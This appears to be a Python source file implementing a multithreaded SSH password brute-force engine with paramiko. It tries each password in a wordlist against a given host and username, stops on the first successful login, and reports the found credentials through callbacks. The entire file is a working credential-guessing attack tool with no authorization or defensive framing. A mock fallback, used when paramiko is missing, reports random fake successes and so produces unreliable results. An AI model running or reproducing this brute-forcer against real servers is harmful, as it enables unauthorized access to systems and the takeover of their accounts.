import threading

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False


class SSHBruteEngine:
    def __init__(self, on_result, on_found, on_done, threads=10):
        self.on_result = on_result
        self.on_found = on_found
        self.on_done = on_done
        self.threads = threads
        self._stop = False

    def start(self, host, port, username, wordlist):
        self._stop = False
        t = threading.Thread(
            target=self._run,
            args=(host, port, username, wordlist),
            daemon=True
        )
        t.start()

    def stop(self):
        self._stop = True

    def _run(self, host, port, username, wordlist):
        from concurrent.futures import ThreadPoolExecutor, as_completed

        futures = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for password in wordlist:
                if self._stop:
                    break
                password = password.strip()
                if not password:
                    continue
                futures.append(
                    executor.submit(self._try, host, port, username, password)
                )

            for future in as_completed(futures):
                if self._stop:
                    break
                result = future.result()
                if result:
                    self.on_result(result)
                    if result["success"]:
                        self._stop = True
                        self.on_found(result)

        self.on_done()

    def _try(self, host, port, username, password):
        if not HAS_PARAMIKO:
            # Mock rejim
            import random
            success = random.random() < 0.05
            return {
                "username": username,
                "password": password,
                "success": success
            }

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=5
            )
            client.close()
            return {
                "username": username,
                "password": password,
                "success": True
            }
        except paramiko.AuthenticationException:
            return {
                "username": username,
                "password": password,
                "success": False
            }
        except Exception:
            return None